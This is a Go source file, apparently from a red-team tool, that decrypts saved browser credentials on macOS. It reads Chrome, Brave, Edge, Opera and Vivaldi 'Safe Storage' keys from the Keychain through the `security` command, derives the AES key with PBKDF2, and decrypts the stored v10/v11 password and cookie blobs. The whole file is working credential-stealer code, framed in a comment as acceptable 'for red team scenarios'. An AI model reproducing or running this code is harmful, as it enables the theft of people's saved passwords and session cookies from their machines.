//go:build decrypt && darwin

package decrypt

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"fmt"
	"os/exec"
	"strings"

	"golang.org/x/crypto/pbkdf2"
)

// keychainServiceName maps browsers to their macOS Keychain "Safe Storage" entry.
func keychainServiceName(browser string) string {
	switch strings.ToLower(browser) {
	case "chrome":
		return "Chrome Safe Storage"
	case "chromium":
		return "Chromium Safe Storage"
	case "brave":
		return "Brave Safe Storage"
	case "edge":
		return "Microsoft Edge Safe Storage"
	case "opera":
		return "Opera Safe Storage"
	case "vivaldi":
		return "Vivaldi Safe Storage"
	}
	return browser + " Safe Storage"
}

// enableAppBoundV20 is a no-op on macOS — there is no app-bound
// encryption on this platform.
func enableAppBoundV20() {}

// getChromiumMasterKey shells out to `security find-generic-password` to
// retrieve the keychain-stored Safe Storage password.
// NOTE: this prompts the user for keychain access on first run — acceptable
// for red team scenarios per spec.
func getChromiumMasterKey(profileDir, browserName string) (*chromiumKeys, error) {
	svc := keychainServiceName(browserName)
	out, err := exec.Command("security", "find-generic-password", "-wa", svc).Output()
	if err != nil {
		return nil, fmt.Errorf("%w: security find-generic-password %q", err, svc)
	}
	password := strings.TrimSpace(string(out))
	return &chromiumKeys{V10: pbkdf2.Key([]byte(password), []byte("saltysalt"), 1003, 16, sha1.New)}, nil
}

func chromiumDecryptValue(blob []byte, keys *chromiumKeys) ([]byte, error) {
	if len(blob) < 3 {
		return nil, fmt.Errorf("blob too short")
	}
	if bytes.Equal(blob[:3], []byte("v10")) || bytes.Equal(blob[:3], []byte("v11")) {
		blob = blob[3:]
	}
	key := keys.V10
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(blob)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("ciphertext not a multiple of block size")
	}
	iv := bytes.Repeat([]byte{' '}, 16)
	mode := cipher.NewCBCDecrypter(block, iv)
	out := make([]byte, len(blob))
	mode.CryptBlocks(out, blob)
	if len(out) > 0 {
		pad := int(out[len(out)-1])
		if pad > 0 && pad <= len(out) {
			out = out[:len(out)-pad]
		}
	}
	return out, nil
}
